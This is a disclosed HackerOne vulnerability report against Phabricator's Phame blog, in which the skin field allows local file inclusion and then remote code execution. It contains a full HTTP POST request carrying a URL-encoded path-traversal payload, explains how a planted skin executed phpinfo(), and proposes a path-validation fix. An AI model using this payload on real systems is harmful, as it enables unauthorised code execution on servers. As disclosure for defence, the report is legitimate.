@@ -1,0 +1,46 @@
+ReportLink:https://hackerone.com/reports/39428
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/nullsub
+ReportedTo:Phabricator(phabricator)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:14.01.2015 18:50:23
+
+Summary:
+
+Phabricator's Phame blog allows users to set a skin.
+
+An attacker with the ability to upload files to the server can exploit this LFI vulnerability to gain remote code execution through Phabricator and thus, gain access to Phabricator's data. Common scenarios may include:
+
+- A box serving Phabricator and other web application that would allow uploading files to controlled paths.
+- A box where the attacker can log in through ssh as a restricted user (not having access to Phabricator's files, but having access to write in /tmp, for instance)
+- etc ...
+
+While testing, I used the following request to create a blog:
+
+```
+POST /phame/blog/new/ HTTP/1.1
+Host: phabricator
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://phabricator.48bits.com/phame/blog/new/
+Cookie: phsid=o36kfovszv6sqpbjheacicu2ykx25lqoh5iepeit; phusr=guest
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 254
+
+__csrf__=B%40acbxwmgk39152b45fd9eff2e&__form__=1&name=xxxx&description=bla&can_view=users&can_edit=users&can_join=users&custom_domain=&skin=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%74%65%73%74
+```
+
+That makes phabricator try to load the skin template php files from:
+
+/var/www/phabricator/phabricator/externals/skins/../../../../../../../../../../tmp/test/
+
+In order to exploit the vulnerability a valid skin structure must exist at the specified location, I have simply copied the oblivious skin and modified it to output a phpinfo() within the header.php script with the expected results.
+
+Proposed fix:
+
+Phabricator should verify that the skin's path is not outside its own root.
